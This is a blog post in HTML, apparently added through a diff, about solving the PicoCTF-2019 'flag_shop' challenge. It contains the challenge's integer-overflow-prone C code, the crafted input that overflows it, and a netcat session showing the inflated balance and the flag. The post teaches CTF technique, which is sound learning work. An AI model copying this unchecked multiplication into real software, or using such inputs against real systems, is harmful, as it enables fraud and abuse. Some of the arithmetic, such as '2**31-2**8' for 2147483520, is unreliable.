@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Integer Overflow for the Perfectionst Beginner // Ophir Harpaz&#39;s Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.69.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Ophir Harpaz" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ophirharpaz.github.io/css/main.min.ae2c98d0a99ba1fcfa761cdd94c664d871f397fdc15abbe8c66dc5fb512ebe27.css" />
+    <link rel="icon" type="image/png" href="favicon.png">
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Integer Overflow for the Perfectionst Beginner"/>
+<meta name="twitter:description" content="Sometimes you succeed in solving a problem but you don&rsquo;t truly understand why it worked. This is what happened to Mor and me when we solved PicoCTF-2019 challenge called flag_shop.
+In this challenge, you are a visitor in a flag shop. You can purchase the flag for a certain number of coins, then print it and win. The problem is, the winning flag costs 100,000 coins, and we only have 1,100."/>
+
+    <meta property="og:title" content="Integer Overflow for the Perfectionst Beginner" />
+<meta property="og:description" content="Sometimes you succeed in solving a problem but you don&rsquo;t truly understand why it worked. This is what happened to Mor and me when we solved PicoCTF-2019 challenge called flag_shop.
+In this challenge, you are a visitor in a flag shop. You can purchase the flag for a certain number of coins, then print it and win. The problem is, the winning flag costs 100,000 coins, and we only have 1,100." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ophirharpaz.github.io/posts/integer-overflow-for-perfectionist-beginners/" />
+<meta property="article:published_time" content="2020-06-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-06T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ophirharpaz.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Ophir Harpaz" /></a>
+      <h1>Ophir Harpaz&#39;s Blog</h1>
+      <p>Hi, I&#39;m Ophir :) I&#39;m a security researcher at Guardicore. This blog is where I share my research &amp; findings in tech and security. Feel free to talk to me!</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://twitter.com/ophirharpaz" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://github.com/ophirharpaz" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="mailto:ophirharpaz@gmail.com" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-mail">
+  <title>mail</title>
+  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Integer Overflow for the Perfectionst Beginner</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 6, 2020
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <p>Sometimes you succeed in solving a problem but you don&rsquo;t truly understand why it worked. This is what happened to <a href="https://twitter.com/MatalonMor">Mor</a> and me when we solved <a href="https://2019game.picoctf.com/problems">PicoCTF-2019</a> challenge called <em>flag_shop</em>.</p>
+<p>In this challenge, you are a visitor in a flag shop. You can purchase the flag for a certain number of coins, then print it and win. The problem is, the winning flag costs 100,000 coins, and we only have 1,100. However, there&rsquo;s a much cheaper flag in the shop which costs only 900 coins.</p>
+<p>The code for buying cheap flags is as follows [1]:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> account_balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">1100</span>;
+<span style="color:#66d9ef">int</span> number_flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">int</span> total_cost <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+    scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>number_flags);
+    <span style="color:#66d9ef">if</span>(number_flags <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+        total_cost <span style="color:#f92672">=</span> <span style="color:#ae81ff">900</span> <span style="color:#f92672">*</span> number_flags;
+        <span style="color:#66d9ef">if</span> (total_cost <span style="color:#f92672">&lt;=</span> account_balance) {
+            account_balance <span style="color:#f92672">=</span> account_balance <span style="color:#f92672">-</span> total_cost;
+        }
+        <span style="color:#66d9ef">else</span> {
+            printf(<span style="color:#e6db74">&#34;Not enough balance</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        }
+    }
+}
+</code></pre></div><p>[1] - This is a slight simplification of the challenge, but the main concept remains.</p>
+<p>Quite quickly we understood that our goal was to <strong>increase</strong> <code>account_balance</code> to a value higher than 100,000 - the price of our desired flag. If only <code>total_cost</code> could be negative (line 9), we could increase our balance. The good news is, <code>total_cost</code> <strong>can</strong> be negative if we trigger an integer overflow. Namely, if <code>total_cost</code> is high enough such that its most-significant bit is set - it&rsquo;ll be considered negative (if you&rsquo;re not at all familiar with integer overflows, <a href="https://en.wikipedia.org/wiki/Integer_overflow">read</a> and then come back, we&rsquo;ll be waiting).</p>
+<h3 id="first-attempt">First Attempt</h3>
+<p>Our first thought was &ldquo;Ok, let&rsquo;s have <code>number_flags = -1</code>&rdquo;. This will cause the total cost to be -900, leading to our balance growing by 900, right?
+-1 is represented by 32 set bits, which can be obtained from the number <code>2**32-1</code>. But this didn&rsquo;t work, and nothing happened to our balance.</p>
+<p>In a quick brute-force attempt we passed <code>2**31-1</code> as an input and <strong>boom</strong>, our balance increased to 2000.
+So we managed to trigger the integer overflow, because <code>total_cost</code> was negative, but why with the second input and not the first?</p>
+<h3 id="breakdown">Breakdown</h3>
+<p>It took us some time to rediscover the first <code>if</code> statement (line 6). When our input was <code>2**32-1 = -1</code>, we never reached the code which calculates our new balance. So <code>2**32-1</code> was prone to failure. But why, <strong>why</strong> did <code>2**31-1</code> did the job in getting us +900 coins?</p>
+<p>Let&rsquo;s go back to some theory.</p>
+<ul>
+<li>Unsigned integers of 32 bits can represent any value between <code>0</code> and <code>2**32-1</code>.</li>
+<li>Signed integers of the same size can represent any value between <code>-2**31</code> and <code>2**31-1</code>.</li>
+</ul>
+<p>By providing <code>2**31-1</code> as input, we practically gave the <strong>highest positive number</strong> possible with a signed integer.
+This is why we successfully passed the <code>if</code> check - the number of requested flags was positive.
+But how come <code>2**31-1</code>, which is the highest positive number, resulted in the same value we expected to get with <code>2**32-1</code>?</p>
+<p>Let&rsquo;s do the math associated with line 7. And trust me, if it&rsquo;s me who&rsquo;s doing the math, it&rsquo;s going to be easy.</p>
+<pre><code>total_cost = 900 * number_flags
+           = 900 * (2**31 - 1)
+           = 450 * 2 * (2**31 - 1)
+           = 450 * 2 * 2**31 - (450 * 2 * 1)
+           = 450 * 2**32 - (900)  
+           = 450 * 0 - 900  // 2**32 is one followed by 32 zeros, thus a zero
+           = -900
+</code></pre><p>This is how we got -900. What would have happened with <code>2**32-1</code>?</p>
+<pre><code>total_cost = 900 * number_flags
+           = 900 * (2**32 - 1)
+           = 450 * 2 * (2**32 - 1)
+           = 450 * 2 * 2**32 - (450 * 2 * 1)
+           = 450 * 2**33 - (900)  
+           = 450 * 0 - 900  // 2**33 reuslts in a zero for the same reason as before
+           = -900
+</code></pre><p>Practially, the same thing happens. Both inputs are large enough to result in a zero, leaving only the <code>-900</code> &ldquo;remainder&rdquo;. The only difference with regards to the challenge is that the first input passes the positivity check (line 6 in the challenge code), whereas the second doesn&rsquo;t.</p>
+<h3 id="bonus-the-one-iteration-solution">Bonus: The One-Iteration Solution</h3>
+<p>What if we had to reach a balance higher than 100,000 with only a <em>single</em> iteration? What if we wanted the quickest win possible?
+Recall that with an input of <code>2**31-1</code>, we got an increase of <code>900*1</code>.
+What happens with <code>2**31-2</code>?</p>
+<pre><code>total_cost = 900 * (2**32 - 2)
+           = 450 * 2 * (2**32 - 2)
+           = 450 * 2 * 2**32 - (450 * 2 * 2)
+           = 450 * 2**33 - (1800)
+           = 450 * 0 - 1800
+           = -1800
+</code></pre><p>To generalize, for input <code>2**31-i</code> we get an increase of <code>900*i</code>.</p>
+<p>If so, we need to choose an <code>i</code> for which <code>1100 + 900*i &gt; 100000</code>. Such an <code>i</code> can be, for example, <code>128 = 2**7</code>. This gives us:</p>
+<pre><code>1100 + 900 * 128 = 116300 &gt; 100000
+</code></pre><p>Our input needs to be <code>2**31-2**8 = ‭2147483520‬</code>. Here&rsquo;s what we get back (notice the balance after the transaction):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vm@ophir-Virtual-Machine:~$ nc 2019shell1.picoctf.com <span style="color:#ae81ff">14937</span>
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+<span style="color:#ae81ff">2</span>
+
+Currently <span style="color:#66d9ef">for</span> sale
+1. Defintely not the flag Flag
+2. <span style="color:#ae81ff">1337</span> Flag
+<span style="color:#ae81ff">1</span>
+
+These knockoff Flags cost <span style="color:#ae81ff">900</span> each, enter desired quantity
+<span style="color:#ae81ff">2147483520</span>
+
+The final cost is: -115200
+
+Your current balance after transaction: <span style="color:#ae81ff">116300</span>
+
+... Commands to purchase the winning flag
+    now that we have enough money ...
+
+YOUR FLAG IS: picoCTF<span style="color:#f92672">{</span>m0n3y_bag5_e062f0fd<span style="color:#f92672">}</span>
+</code></pre></div><h2 id="wrap-up">Wrap-Up</h2>
+<p>We love doing bit arithmetics and we cannot lie.</p>
+<p>Sometimes, capturing the flag will suffice, and sometime you&rsquo;ll want to know more.
+This was a case of wanting to know more.</p>
+<p>We hope this was an enjoyable read for you.</p>
+<p><strong>Mor &amp; Ophir</strong></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
